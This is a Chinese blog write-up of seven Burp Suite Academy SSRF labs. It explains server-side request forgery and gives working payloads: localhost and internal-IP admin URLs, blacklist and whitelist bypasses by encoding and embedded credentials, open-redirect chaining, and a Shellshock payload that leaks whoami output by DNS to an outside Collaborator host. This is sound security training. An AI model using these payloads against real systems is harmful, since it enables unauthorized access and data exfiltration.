# 原创
：  【burpsuite安全练兵场-服务端9】服务端请求伪造SSRF漏洞-7个实验（全）

# 【burpsuite安全练兵场-服务端9】服务端请求伪造SSRF漏洞-7个实验（全）

  <img alt="" src="https://img-blog.csdnimg.cn/2e86bda3ff034c71920f2f40732c3929.gif"/>

## 前言：

> 
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/c2dfbe518f7d43a2978e4e6f1bfd5ea1.gif" width="24"/>介绍： </h3>
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>博主：网络安全领域狂热爱好者（承诺在CSDN永久无偿分享文章）。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>殊荣：CSDN网络安全领域优质创作者，2022年双十一业务安全保卫战-某厂第一名，某厂特邀数字业务安全研究员，edusrc高白帽，vulfocus、攻防世界等平台排名100+、高校漏洞证书、cnvd原创漏洞证书等。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>擅长：对于技术、工具、漏洞原理、黑产打击的研究。
<img alt="" height="28" src="https://img-blog.csdnimg.cn/3e1c80dc452343c9b3e29c5030fa90b1.png" width="28"/>C站缘：C站的前辈，引领我度过了一个又一个技术的瓶颈期、迷茫期。
<hr/>
<h3><img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：</h3>
<img alt="" height="23" src="https://img-blog.csdnimg.cn/b1b5426baac44b97b68428245cc35d77.png" width="23"/>面向读者：对于网络安全方面的学者。 
<img alt="" height="23" src="https://img-blog.csdnimg.cn/19ea593260b84ec8b836a336326fa0cc.png" width="23"/>本文知识点（读者自测）： 
（1）服务器端请求伪造（SSRF）（√）
（2）SSRF常见攻击（√）
（3）绕过SSRF的普通防御（√）
（4）盲SSRF漏洞（√）
（5）寻找SSRF漏洞的隐藏攻击面（√）


### <img alt="" height="24" src="https://img-blog.csdnimg.cn/9f7cfdd7c4294c9e9bff7ef35f552f0c.gif" width="24"/>导读：

---


**目录**

[一、服务器端请求伪造（SSRF）](#%E4%B8%80%E3%80%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88SSRF%EF%BC%89)

[1、SSRF简述：](#1%E3%80%81SSRF%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、影响](#2%E3%80%81%E5%BD%B1%E5%93%8D)

[二、SSRF常见攻击](#%E4%BA%8C%E3%80%81SSRF%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB)

[1、SSRF攻击服务器本身](#1%E3%80%81SSRF%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9C%AC%E8%BA%AB)

[        ](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E9%92%88%E5%AF%B9%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%ACSSRF)[实验1：针对本地服务器的基本SSRF](#%E5%AE%9E%E9%AA%8C1%EF%BC%9A%E9%92%88%E5%AF%B9%E6%9C%AC%E5%9C%B0%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%9F%BA%E6%9C%ACSSRF)

[ 2、SSRF攻击其他后端系统](#%C2%A02%E3%80%81SSRF%E6%94%BB%E5%87%BB%E5%85%B6%E4%BB%96%E5%90%8E%E7%AB%AF%E7%B3%BB%E7%BB%9F)

[        ](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E5%9F%BA%E6%9C%ACSSRF%E4%B8%8E%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%90%8E%E7%AB%AF%E7%B3%BB%E7%BB%9F)[实验2：基本SSRF与另一个后端系统](#%E5%AE%9E%E9%AA%8C2%EF%BC%9A%E5%9F%BA%E6%9C%ACSSRF%E4%B8%8E%E5%8F%A6%E4%B8%80%E4%B8%AA%E5%90%8E%E7%AB%AF%E7%B3%BB%E7%BB%9F)

[三、绕过SSRF的普通防御](#%E4%B8%89%E3%80%81%E7%BB%95%E8%BF%87SSRF%E7%9A%84%E6%99%AE%E9%80%9A%E9%98%B2%E5%BE%A1)

[1、SSRF具有基于黑名单的输入滤波器](#1%E3%80%81SSRF%E5%85%B7%E6%9C%89%E5%9F%BA%E4%BA%8E%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E8%BE%93%E5%85%A5%E6%BB%A4%E6%B3%A2%E5%99%A8)

[        ](#%E5%AE%9E%E9%AA%8C3%EF%BC%9ASSRF%E5%85%B7%E6%9C%89%E5%9F%BA%E4%BA%8E%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E8%BE%93%E5%85%A5%E6%BB%A4%E6%B3%A2%E5%99%A8)[实验3：SSRF具有基于黑名单的输入滤波器](#%E5%AE%9E%E9%AA%8C3%EF%BC%9ASSRF%E5%85%B7%E6%9C%89%E5%9F%BA%E4%BA%8E%E9%BB%91%E5%90%8D%E5%8D%95%E7%9A%84%E8%BE%93%E5%85%A5%E6%BB%A4%E6%B3%A2%E5%99%A8)

[2、SSRF具有基于白名单的输入过滤器](#2%E3%80%81SSRF%E5%85%B7%E6%9C%89%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E8%BE%93%E5%85%A5%E8%BF%87%E6%BB%A4%E5%99%A8)

[        ](#%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E5%85%B7%E6%9C%89%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E8%BE%93%E5%85%A5%E6%BB%A4%E6%B3%A2%E5%99%A8%E7%9A%84SSRF)[实验6：具有基于白名单的输入滤波器的SSRF](#%E5%AE%9E%E9%AA%8C6%EF%BC%9A%E5%85%B7%E6%9C%89%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95%E7%9A%84%E8%BE%93%E5%85%A5%E6%BB%A4%E6%B3%A2%E5%99%A8%E7%9A%84SSRF)

[3、通过开放重定向绕过SSRF滤波器](#3%E3%80%81%E9%80%9A%E8%BF%87%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E7%BB%95%E8%BF%87SSRF%E6%BB%A4%E6%B3%A2%E5%99%A8)

[        ](#%E5%AE%9E%E9%AA%8C4%EF%BC%9ASSRF%E9%80%9A%E8%BF%87%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%99%A8)[实验4：SSRF通过开放重定向漏洞绕过过滤器](#%E5%AE%9E%E9%AA%8C4%EF%BC%9ASSRF%E9%80%9A%E8%BF%87%E5%BC%80%E6%94%BE%E9%87%8D%E5%AE%9A%E5%90%91%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E5%99%A8)

[四、盲SSRF漏洞](#%E5%9B%9B%E3%80%81%E7%9B%B2SSRF%E6%BC%8F%E6%B4%9E)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、影响：](#2%E3%80%81%E5%BD%B1%E5%93%8D%EF%BC%9A)

[3、发现和利用SSRF漏洞](#3%E3%80%81%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8SSRF%E6%BC%8F%E6%B4%9E)

[        ](#%C2%A0%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E5%B8%A6%E5%A4%96%E6%A3%80%E6%B5%8B%E7%9A%84%E7%9B%B2SSRF)[实验5：带外检测的盲SSRF](#%C2%A0%E5%AE%9E%E9%AA%8C5%EF%BC%9A%E5%B8%A6%E5%A4%96%E6%A3%80%E6%B5%8B%E7%9A%84%E7%9B%B2SSRF)

[        ](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E5%88%A9%E7%94%A8Shellshock%E7%9A%84%E7%9B%B2SSRF)[实验7：利用Shellshock的盲SSRF](#%E5%AE%9E%E9%AA%8C7%EF%BC%9A%E5%88%A9%E7%94%A8Shellshock%E7%9A%84%E7%9B%B2SSRF)

[五、寻找SSRF漏洞的隐藏攻击面](#%E4%BA%94%E3%80%81%E5%AF%BB%E6%89%BESSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%9A%90%E8%97%8F%E6%94%BB%E5%87%BB%E9%9D%A2)

[1、简述：](#1%E3%80%81%E7%AE%80%E8%BF%B0%EF%BC%9A)

[2、请求中的部分URL](#2%E3%80%81%E8%AF%B7%E6%B1%82%E4%B8%AD%E7%9A%84%E9%83%A8%E5%88%86URL)

[3、数据格式中的URL](#3%E3%80%81%E6%95%B0%E6%8D%AE%E6%A0%BC%E5%BC%8F%E4%B8%AD%E7%9A%84URL)

[4、SSRF通过Referer报头](#4%E3%80%81SSRF%E9%80%9A%E8%BF%87Referer%E6%8A%A5%E5%A4%B4)

---


## 一、服务器端请求伪造（SSRF）

> 
<h3>1、SSRF简述：</h3>
1、服务器端请求伪造（也称为SSRF）是一个Web安全漏洞，允许攻击者诱使服务器端应用程序向非预期位置发出请求。
<hr/>
2、在典型的SSRF攻击中，攻击者可能会使服务器连接到组织基础设施中的仅限内部的服务。在其他情况下，它们可能会强制服务器连接到任意外部系统，从而可能泄漏授权凭据等敏感数据
<hr/>
3、SSRF攻击经常利用信任关系从易受攻击的应用程序升级攻击并执行未经授权的操作。这些信任关系可能与服务器本身相关，也可能与同一组织内的其他后端系统相关。 


---


> 
<h3>2、影响</h3>
1、成功的SSRF攻击通常会导致未经授权的操作或对组织内数据的访问，无论是在易受攻击的应用程序本身还是在应用程序可以与之通信的其他后端系统上。在某些情况下，SSRF漏洞可能允许攻击者执行任意命令。
<hr/>
2、导致连接到外部第三方系统的SSRF漏洞利用可能会导致恶意的向前攻击，这些攻击似乎源自托管易受攻击的应用程序的组织。 


---


---


## 二、SSRF常见攻击

> 
<h3>1、SSRF攻击服务器本身</h3>
1、在针对服务器本身的SSRF攻击中，攻击者诱使应用程序通过其环回网络接口向托管应用程序的服务器发出HTTP请求。这通常涉及提供一个带有主机名的URL，如127.0.0.1（指向环回适配器的保留IP地址）或localhost（同一适配器的常用名称）2、例如一个购物应用程序，它允许用户查看某个商品在特定商店中是否有库存。要提供库存信息，应用程序必须查询各种后端REST API，具体取决于所涉及的产品和商店。该函数是通过前端HTTP请求将URL传递给相关后端API端点来实现的。
<pre><code>当用户查看商品的库存状态时，浏览器会发出如下请求： 

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1</code></pre>
<pre><code>这将导致服务器向指定的URL发出请求，检索库存状态，并将其返回给用户。
在这种情况下，攻击者可以修改请求以指定服务器本身的本地URL。例如： 

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://localhost/admin
（服务器将获取/admin URL的内容并将其返回给用户）</code></pre>

2、现在攻击者可以直接访问/admin URL。但是管理功能通常只有经过身份验证的适当用户才能访问。因此，直接访问URL的攻击者不会看到任何感兴趣的内容。但如果对/admin URL的请求来自本地计算机本身，则会绕过正常的访问控制。应用程序赠款对管理功能的完全访问权限，因为请求似乎来自受信任的位置。
<hr/>
3、应用程序以这种方式运行，并且隐式地信任来自本地计算机的请求的原因：
<pre><code>    1、访问控制检查可以在位于应用服务器前面的不同组件中实现。当重新建立到服务器本身的连接时，将跳过检查。
    2、出于灾难恢复的目的，应用程序可能允许来自本地计算机的任何用户在不登录的情况下进行管理访问。这为管理员提供了一种在丢失凭据时恢复系统的方法。这里的假设是只有完全信任的用户直接来自服务器本身。
    3、管理界面可能正在侦听与主应用程序不同的端口号，因此用户可能无法直接访问。</code></pre>
这种类型的信任关系，其中来自本地机器的请求与普通请求的处理方式不同，通常使SSRF成为一个严重的漏洞。
<hr/>
4、涉及实验：<br/> 实验1：针对本地服务器的基本SSRF


---


> 
<h3>实验1：针对本地服务器的基本SSRF</h3>
信息：
本实验具有从内部系统获取数据的库存检查功能。
要解决实验问题，更改库存检查URL以访问管理界面http://localhost/admin，并删除用户carlos<br/>  
<hr/>
part1:
浏览到/admin，发现您无法直接访问管理页面

<hr/>
part2:
访问一个产品，点击"检查库存"，拦截请求，并将其发送到repeater

 将stockApi参数中的URL更改为http://localhost/admin（将显示管理界面）<img alt="" height="931" src="https://img-blog.csdnimg.cn/0ae5c18b8b9d42be98c1367b267363a2.png" width="1200"/>

读取HTML以标识要删除目标用户的URL，该URL为：
<pre>`http://localhost/admin/delete?username=carlos`</pre>

在stockApi参数中提交此URL，以传递SSRF攻击。
 <img alt="" height="931" src="https://img-blog.csdnimg.cn/5ff303a1f6de4309a805581ace9c596e.png" width="1200"/>
刷新页面



---


> 
<h3> 2、SSRF攻击其他后端系统</h3>
1、另一种类型的信任关系经常伴随着服务器端请求伪造而出现，即应用服务器能够与用户无法直接访问的其他后端系统交互。这些系统通常具有不可路由的私有IP地址。由于后端系统通常受网络拓扑的保护，因此它们的安全性通常较弱。在许多情况下，内部后端系统包含敏感功能，能够与系统交互的任何人都可以在不进行身份验证的情况下访问这些功能。
<hr/>
2、假设后端URL www.example.com处有一个管理界面https://192.168.0.68/admin
<pre><code>攻击者可以通过提交以下请求利用SSRF漏洞访问管理界面

POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://192.168.0.68/admin</code></pre>

<hr/>
3、涉及实验：
实验2：基本SSRF与另一个后端系统


---


> 
<h3>实验2：基本SSRF与另一个后端系统</h3>
信息：
这个实验室有一个库存检查功能，可以从内部系统中获取数据
要解决这个问题，使用库存检查功能扫描内部192.168.0.X 范围，找到端口8080上的管理界面，然后用它删除用户 Carlos
<hr/>
part1:
访问一个产品，点击"检查库存"，在Burp Suite中拦截请求


<hr/>
part2：
进行攻击
并将其发送到Burp入侵者<br/> 先"Clear §"，将 stockApi 参数更改为http://192.168.0.1:8080/admin
然后突出显示 IP 地址的最后八位数(数字1) ，点击Add§


Payloads设置，将有效负载类型更改为Numbers，并在"From"、"To"和"Step"框中分别输入1、255和1
并单击"开始攻击"



按状态代码升序对其进行排序，看到一个状态为200的条目，其中显示了一个管理界面



<br/> 右键此请求，将其发送到Burp Repeater，并将stockApi中的路径更改为：
<pre>`http://192.168.0.135:8080/admin/delete?username=carlos`</pre>

 <img alt="" height="476" src="https://img-blog.csdnimg.cn/b10d746a0dff454fbd6f2344f7acc1b9.png" width="1200"/>



---


---


---


## 三、绕过SSRF的普通防御

> 
<h3>1、SSRF具有基于黑名单的输入滤波器</h3>
1、有些应用程序会阻止包含主机名（如127.0.0.1和localhost）或敏感URL（如/admin）的输入。在这种情况下，通常可以使用各种技术绕过筛选器：
<pre><code>    1、使用www.example.com的替代IP表示法127.0.0.1，例如2130706433、017700000001或127.1
    2、注册您自己的域名，解析为127.0.0.1。您可以使用spoofed.burpcollaborator.net来实现此目的。
    3、使用URL编码或大小写变化混淆被阻止的字符串。</code></pre>
<hr/>
2、涉及实验：<br/> 实验3：SSRF具有基于黑名单的输入滤波器


> 
<h3>实验3：SSRF具有基于黑名单的输入滤波器</h3>
信息：
本实验具有从内部系统获取数据的库存检查功能。
要解决实验问题，请更改库存检查URL以访问管理界面http://localhost/admin，并删除用户carlos
开发者已经部署了两个弱的反SSRF防御，需要绕过它们
<hr/>
part1:
访问一个产品，点击"检查库存"，使用BP拦截请求，并将其发送到repeater


<br/> 改变stockApi参数为
<pre>`http://127.0.0.1/`</pre>
错误提示，看出并观察到请求被阻止


<hr/>
part2：
绕过过滤器<br/> 通过将URL更改为
<pre>`http://127.1/`</pre>

将URL更改为
<pre>`http://127.1/admin`</pre>
并观察到该URL再次被阻止
<img alt="" height="931" src="https://img-blog.csdnimg.cn/4c98729c1aba4f998faee394ba344d36.png" width="1200"/><br/> 将"a"进行双URL编码为%2561
<pre>`http://127.1/%2561dmin`</pre>


<pre>`/admin/delete?username=carlos`</pre>
<hr/>
part3：
完成实验
以访问管理界面并删除目标用户
<pre>`http://127.1/%2561dmin/delete?username=carlos`</pre>
 <img alt="" height="931" src="https://img-blog.csdnimg.cn/9a371a82b6034ab0965c114cd10d0dc5.png" width="1200"/>
 <img alt="" height="417" src="https://img-blog.csdnimg.cn/0f531e3e282940738033bca8ec581bd2.png" width="1200"/>



---


<br/>  

> 
<h3>2、SSRF具有基于白名单的输入过滤器</h3>
1、某些应用程序只允许与允许值的白名单匹配、以其开头或包含其的输入。在这种情况下，有时可以利用URL解析中的不一致性来绕过过滤器。
<pre><code>URL规范包含许多在实现对URL的即席解析和验证时容易被忽略的特性：

1、可以使用@字符在主机名之前的 URL 中嵌入凭据。 例如：
    https://expected-host(预期主机)@evil-host(恶意主机)

2、可以使用 # 字符来表示 URL 片段。例如：
    https：//evil-host(恶意主机)#expected-host(预期主机)

3、可以利用DNS命名层次结构将所需的输入放入您控制的完全限定DNS名称中。例如：
    https://expected-host.evil-host

4、可以对字符进行URL编码以混淆URL分析代码。如果实现筛选器的代码与执行后端HTTP请求的代码处理URL编码的字符的方式不同，则这一点特别有用

5、可以将这些技术结合使用</code></pre>
<hr/>
涉及实验：<br/> 实验6：具有基于白名单的输入滤波器的SSRF


> 
<h3>实验6：具有基于白名单的输入滤波器的SSRF</h3>
信息：
本实验具有从内部系统获取数据的库存检查功能。
要解决实验问题：更改库存检查URL以访问管理界面http：//localhost/admin，并删除用户carlos
开发者已经部署了一个反SSRF的防御，需要绕过它。
<hr/>
part1:
访问一个产品，点击"检查库存"，BP拦截请求，并将其发送到repeater
<img alt="" height="890" src="https://img-blog.csdnimg.cn/5515e16419084007b73cb21847254798.png" width="1200"/><br/> 将stockApi参数中的URL更改为
<pre>`http://127.0.0.1/`</pre>
然后观察应用程序是否正在解析URL、提取主机名并根据白名单对其进行验证。
 <img alt="" height="931" src="https://img-blog.csdnimg.cn/77d737fa6bcd45abac9c707c72d73315.png" width="1200"/>


将URL更改为
<pre>`http://username@stock.weliketoshop.net/`</pre>
并观察其是否被接受，结果表明URL解析器支持嵌入式凭据



在用户名后附加一个#，观察URL被拒绝



双URL将#编码为%2523，并观察非常可疑的“Internal Server Error”响应，该响应指示服务器可能已尝试连接到“username”

<hr/>
part2:
完成实验 
要访问管理界面并删除目标用户，将URL更改为：
<pre>`http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos`</pre>




---


> 
<h3>3、通过开放重定向绕过SSRF滤波器</h3>
1、有时可以通过利用开放的重定向漏洞来绕过任何类型的基于过滤器的防御。
<hr/>
2、假设用户提交的URL经过严格验证，以防止对SSRF行为的恶意利用。但允许其URL的应用程序包含一个开放的重定向漏洞。如果用于使后端HTTP请求支持重定向的API，则可以构造一个满足过滤器的URL，并将请求重定向到所需的后端目标
<pre><code>例如，假设应用程序包含一个开放的重定向漏洞，其中以下URL：
/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net

返回重定向到：
http://evil-user.net</code></pre>
<hr/>
3、可以利用开放重定向漏洞绕过URL过滤器，并利用SSRF漏洞进行攻击
<pre><code>例如：
POST /product/stock HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 118

stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin</code></pre>
这个SSRF攻击之所以有效，是因为应用程序首先验证提供的stockAPI URL是否在允许的域中，它确实是。然后应用程序请求提供的URL，这将触发打开重定向。它遵循重定向，并向攻击者选择的内部URL发出请求
<hr/>
4、涉及实验：<br/> 实验4：SSRF通过开放重定向漏洞绕过过滤器


---


> 
<h3>实验4：SSRF通过开放重定向漏洞绕过过滤器</h3>
信息：
这个实验室有一个库存检查功能，可以从内部系统获取数据
要解决这个实验室：改变库存检查的 URL，以访问 http://192.168.0.12:8080/admin 的管理界面，并删除用户 carlos
库存检查器被限制为只能访问本地应用程序，因此需要首先找到一个影响应用程序的打开重定向
<hr/>
part1:
访问一个产品，点击"检查库存"，使用BP拦截请求，并将其发送到repeater



<br/> 尝试篡改stockApi参数，观察到无法使服务器直接向其他主机发出请求


<hr/>
part2:
重定向功能<br/> 单击"next product"并观察到path参数被放置到重定向响应的Location头中，从而导致打开重定向
 <img alt="" height="944" src="https://img-blog.csdnimg.cn/99884363f598427b914811649f92002c.png" width="1200"/>
发送到repeater 
创建一个利用开放重定向漏洞的URL，重定向到管理界面，并将其输入股票检查器上的stockApi参数：
<pre>`/product/nextProduct?path=http://192.168.0.12:8080/admin`</pre>
<img alt="" height="931" src="https://img-blog.csdnimg.cn/f57532e5de764047adc302f4c4f24569.png" width="1200"/><br/> 跟随重定向并显示管理页面
（但是重定向没有真真的被执行）


<hr/>
part3：
添加重定向参数，并使用其他方式提交（因为GET提交的重定向会检查参数）


 (这一过程中测试了很多情况)
如（失败的）：


<hr/>
part4：
管理页面
如果失败（注意是cookie的问题，重新拦截发包）
<pre><code>请求头：
POST /product/stock HTTP/1.1

请求数据：
stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin
</code></pre>



<hr/>
part5：
完成实验
修改路径以删除目标用户


<pre>`/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`</pre>




---


---


---


---


## 四、盲SSRF漏洞

> 
<h3>1、简述：</h3>
1、当应用程序被诱导向提供的URL发出后端HTTP请求，但来自后端请求的响应没有在应用程序的前端响应中返回时，就会出现盲SSRF漏洞。
<hr/>
2、盲SSRF通常更难被利用，但有时会导致在服务器或其他后端组件上完全远程执行代码。 


> 
<h3>2、影响：</h3>
盲目SSRF漏洞的影响通常低于完全知情的SSRF漏洞，因为它们是单向的。虽然在某些情况下可以利用它们来实现完全的远程代码执行，但不能轻易利用它们来从后端系统检索敏感数据。 


> 
<h3>3、发现和利用SSRF漏洞</h3>
1、检测盲SSRF漏洞的最可靠方法是使用带外（OAST）技术。这涉及到尝试触发对您控制的外部系统的HTTP请求，并监视与该系统的网络交互。
<hr/>
2、使用带外技术最简单、最有效的方法是使用Burp Collaborator。您可以使用Burp Collaborator客户机生成唯一的域名，将这些域名以有效负载的形式发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入HTTP请求，则它容易受到SSRF攻击。 
<hr/>3、 
 在测试SSRF漏洞时，通常会观察到针对所提供Collaborator域的DNS查找，但没有后续HTTP请求。发生这种情况的原因通常是应用程序试图向域发出HTTP请求，这会导致初始DNS查找，但实际的HTTP请求被网络级过滤阻止。基础设施允许出站DNS流量是相对常见的，因为这是许多目的所需要的，但会阻止到意外目的地的HTTP连接。
<hr/>
4、简单地识别盲人SSRF易损性可以触发带外HTTP请求的漏洞本身并不提供攻击途径。由于无法查看后端请求的响应，因此不能使用该行为来浏览应用服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部IP地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效负载还采用了盲带外技术，那么您可能会发现未打补丁的内部服务器上存在严重漏洞。
<hr/>
5、利用SSRF漏洞的另一个途径是诱使应用程序连接到攻击者控制下的系统，并向建立连接的HTTP客户端返回恶意响应。如果可以利用服务器HTTP实现中的严重客户端漏洞，则可能能够在应用程序基础结构中实现远程代码执行。<br/>  
<hr/>
6、涉及实验：
实验5：带外检测的盲SSRF
实验7：利用Shellshock的盲SSRF


---


---


> 
<h3> 实验5：带外检测的盲SSRF</h3>
信息：
本网站使用分析软件，当产品页面加载时，该软件会获取Referer标题中指定的URL。
要解决实验：使用此功能向公共Burp Collaborator服务器发出HTTP请求。
<hr/>
part1:
访问一个产品，在Burp Suite中拦截请求，并将其发送到Burp Repeater


<hr/>
part2:
使用BP提供的服务器客户端<br/> BP选项卡---BC客户端---复制服务器URL
<pre>`https://xqrbsy7k0bvri28avnpps3ddb4hu5j.burpcollaborator.net`</pre>

 <img alt="" height="842" src="https://img-blog.csdnimg.cn/90a08e1672e74631ab3f876022c8624b.png" width="906"/>

以使用Burp Collaborator生成的域替换原始域（Referer），发送请求



<br/> 转到Collaborator选项卡，再刷新，查看交互信息（看到一些DNS和HTTP交互，这些交互是应用程序由于负载而启动的）

 <img alt="" height="409" src="https://img-blog.csdnimg.cn/39579dd2b7024cd88fb6216587d7e7a0.png" width="1200"/>



---


> 
<h3>实验7：利用Shellshock的盲SSRF</h3>
信息：
本网站使用分析软件，当产品页面加载时，该软件会获取Referer标题中指定的URL。
要解决实验问题，请使用此功能对端口8080上的192.168.0.X范围内的内部服务器执行SSRF盲攻击。在盲目攻击中，对内部服务器使用Shellshock有效负载以泄漏操作系统用户的名称
<hr/>
part1:
在Burp Suite Professional中，从BApp Store安装"Collaborator Everywhere"扩展

<hr/>
part2：
插件的检测
将实验室域添加到Burp Suite的目标范围，以便Collaborator Everywhere将其作为目标。

浏览网站，当加载产品页面时，它通过Referer头触发了与Burp Collaborator的HTTP交互


观察HTTP交互在HTTP请求中包含User-Agent字符串。将对产品页面的请求发送给Burp Intruder


<hr/>
part3：
ssrf盲测
使用Burp Collaborator 客户端生成唯一的 Burp Collaborator 有效载荷，并将其放入以下 Shellshock 有效载荷中<br/><img alt="" height="842" src="https://img-blog.csdnimg.cn/69d2cb8d2d3b44e5949f0b4eb234be10.png" width="906"/>

<pre><code>() { :; }; /usr/bin/nslookup $(whoami).BURP-COLLABORATOR-SUBDOMAIN

我的是：
() { :; }; /usr/bin/nslookup $(whoami).87datwvawy02yijyhbt67qkzfqlh96.burpcollaborator.net

</code></pre>
单击“clear §”，更改 Referer 标头，http://192.168.0.1:8080然后突出显示 IP 地址的最后一个八位字节（数字1），单击“添加 §”



切换到Payloads选项卡，将有效负载类型更改为Numbers，并在"From"、"To"和"Step"框中分别输入1、255和1（单击"开始攻击"）

攻击完成后，返回Collaborator选项卡，然后单击"立即轮询"。应该看到一个DNS交互，它是由被成功的盲SSRF攻击击中的后端系统发起的。操作系统用户的名称应显示在DNS子域中。
（如果始终没有结果，考虑是否是cookie过期，换一个cookie；或者重新复制一个BP客户端URL）




<hr/>
 part5：
完成实验
输入操作系统用户的名称
 <img alt="" height="842" src="https://img-blog.csdnimg.cn/e45dea4b084c4a109749aa8f6bb890c7.png" width="906"/>
 <img alt="" height="653" src="https://img-blog.csdnimg.cn/e276dfc52f9849dfa054669530edb269.png" width="1149"/>




---


---


---


---


## 五、寻找SSRF漏洞的隐藏攻击面

> 
<h3>1、简述：</h3>
许多服务器端请求伪造漏洞相对容易发现，因为应用程序的正常通信涉及包含完整URL的请求参数。SSRF的其他例子更难找到。
<hr/>
<h3>2、请求中的部分URL</h3>
有时，应用程序只将主机名或URL路径的一部分放入请求参数中。然后，提交的值在服务器端合并到请求的完整URL中。如果该值很容易被识别为主机名或URL路径，则潜在的攻击面可能很明显。然而，作为完整SSRF的可利用性可能会受到限制，因为您无法控制所请求的整个URL。 
<hr/>
<h3>3、数据格式中的URL</h3>
一些应用程序传输数据的格式的规范允许包含数据解析器可能会请求的格式的URL。一个明显的例子是XML数据格式，它已广泛用于Web应用程序中将结构化数据从客户机传输到服务器。当应用程序接受XML格式的数据并对其进行解析时，它可能容易受到XXE注射液，并反过来容易受到SSRF通过XXE。我们将在查看时更详细地讨论这一点XXE注射液脆弱性。 
<hr/>
<h3>4、SSRF通过Referer报头</h3>
一些应用程序使用服务器端分析软件来跟踪访问者。该软件通常记录请求中的Referer头，因为这对于跟踪传入链接特别有用。分析软件通常会访问出现在Referer标题中的任何第三方URL。这通常用于分析引用站点的内容，包括传入链接中使用的锚文本。因此，Referer报头通常代表SSRF漏洞的有效攻击面。见盲SSRF漏洞有关Referer标头漏洞的示例。 


### 2、请求中的部分URL

---


### 4、SSRF通过Referer报头

---


---


<img alt="" src="https://img-blog.csdnimg.cn/7d62be979184459ab44139ed85f387fe.png"/>​

> 
<h2><img alt="" height="28" src="https://img-blog.csdnimg.cn/0797a1b4a28e49479db240e038a7969d.png" width="28"/>​网络安全三年之约</h2>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/0052aabacbb147b482912c9fe1950f56.png" width="23"/>​First year </h3>
掌握各种原理、不断打新的靶场
<img alt="" height="23" src="https://img-blog.csdnimg.cn/6b308c9501174788aa24fa4e5ea8fdd2.png" width="23"/>​目标：edusrc、cnvd 
[主页 | 教育漏洞报告平台 (sjtu.edu.cn)https://src.sjtu.edu.cn/](https://src.sjtu.edu.cn/)[https://www.cnvd.org.cnhttps://www.cnvd.org.cn/](https://www.cnvd.org.cn/)
<hr/>
<h3><img alt="" height="23" src="https://img-blog.csdnimg.cn/8439bb91fdfb4e739bacba4c96b9fb17.png" width="23"/>​second year </h3>
不断学习、提升技术运用技巧，研究各种新平台
开始建立自己的渗透体系
<img alt="" height="23" src="https://img-blog.csdnimg.cn/3bc7983d3bac437fbcf8b3530e3ec8d3.png" width="23"/>​目标：众测平台、企业src应急响应中心 
<table border="1" cellpadding="1" cellspacing="1"><tbody>|众测平台|URL
|漏洞盒子|[漏洞盒子 | 互联网安全测试众测平台](https://www.vulbox.com/)
|火线安全平台|[火线安全平台](https://www.huoxian.cn/)
|漏洞银行|[BUGBANK 官方网站 | 领先的网络安全漏洞发现品牌 | 开放安全的提出者与倡导者 | 创新的漏洞发现平台](https://www.bugbank.cn/)
|360漏洞众包响应平台|[360漏洞云漏洞众包响应平台](https://src.360.net/)
|补天平台（奇安信）|[补天 - 企业和白帽子共赢的漏洞响应平台，帮助企业建立SRC](https://www.butian.net/)
|春秋云测|[首页](https://zhongce.ichunqiu.com/)
